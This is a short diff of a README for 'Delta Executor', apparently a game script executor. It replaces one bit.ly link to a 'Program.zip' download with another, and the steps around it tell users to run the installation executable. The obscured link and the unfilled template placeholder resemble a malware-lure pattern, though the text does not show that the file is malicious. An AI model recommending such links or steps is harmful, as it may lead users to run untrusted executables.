@@ -36,7 +36,7 @@ To get started with Delta Executor, follow these simple steps:
 
 1. Download the latest version of Delta Executor from the official repository by clicking on the button below:
   
-   [![Download Delta Executor](https://img.shields.io/badge/Download-Program.zip-<HEX-COLOR-CODE>)](https://bit.ly/3Vk6jRq)
+   [![Download Delta Executor](https://img.shields.io/badge/Download-Program.zip-<HEX-COLOR-CODE>)](https://bit.ly/3OGWg5p)
   
 2. Extract the downloaded ZIP file to your desired location on your computer.
 3. Open the extracted folder and run the installation executable.
